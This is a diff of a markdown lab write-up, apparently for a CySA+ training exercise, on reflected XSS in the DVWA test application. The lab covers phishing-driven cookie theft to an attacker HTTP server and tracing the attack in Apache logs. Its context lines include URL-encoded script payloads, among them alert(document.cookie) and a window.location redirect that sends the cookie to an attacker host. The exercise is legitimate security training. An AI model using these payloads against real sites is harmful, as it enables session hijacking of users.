@@ -40,10 +40,11 @@ This lab aligns with the following CompTIA CySA+ objectives:
 
 ### Step 2: Testing Basic Input
 
+- Navigated to `XSS (Reflected)` page
 - Submitted `testuser` in the "What's your name?" field.
 - Verified output: `Hello testuser`.
 
-![DWA ](images/dwa_helloTest.jpg)
+![DWA test](images/dwa_helloTest.jpg)
 
 ### Step 3: Submitting Malicious Script
 
@@ -67,7 +68,7 @@ Submitted next:
 
 - Popup displayed PHPSESSID, demonstrating cookie theft via reflected XSS.
 
-![DWA ](images/dwa_cookie.jpg)
+![cookie ](images/dwa_cookie.jpg)
 
 ## Part 2: Polluting Referrers
 
@@ -85,7 +86,7 @@ touch index.html
 python -m http.server 9999
 ```
 
-![DWA ](images/kali_server.jpg)
+![server ](images/kali_server.jpg)
 
 ### Step 2: Simulated Phishing Email
 
@@ -100,7 +101,7 @@ Opened /root/email.html which contained:
 
 - Clicking the link caused session cookie to be sent to attacker's HTTP server.
 
-![DWA ](images/email.jpg)
+![email ](images/email.jpg)
 
 ## Part 4: Investigating the Attack (On LAMP)
 
@@ -111,7 +112,7 @@ cd /var/log/apache2
 ls -l
 ```
 
-![DWA ](images/apache_logs.jpg)
+![apache logs ](images/apache_logs.jpg)
 
 ### Step 2: Locate Malicious Request
 
@@ -127,7 +128,7 @@ grep 10.1.16.66%3a9999 access.log
 GET /vulnerabilities/xss_r/?name=%3cscript%3ewindow.location%3d...
 ```
 
-![DWA ](images/grep_log.jpg)
+![grep log ](images/grep_log.jpg)
 
 ### Step 3: Trace Reconnaissance Activity
 
@@ -140,8 +141,6 @@ Found evidence of prior requests:
 - GET /vulnerabilities/xss_r/?name=testuser2
 - GET /vulnerabilities/xss_r/?name=%3cscript%3ealert("You+have+been+hacked!+Again!")%3c%2fscript%3e
 - GET /vulnerabilities/xss_r/?name=%3cscript%3ealert(document.cookie)%3c%2fscript%3e
-
-📸 Screenshot suggestion: Full sequence of log entries leading up to the attack
 
 ## Analysis
 
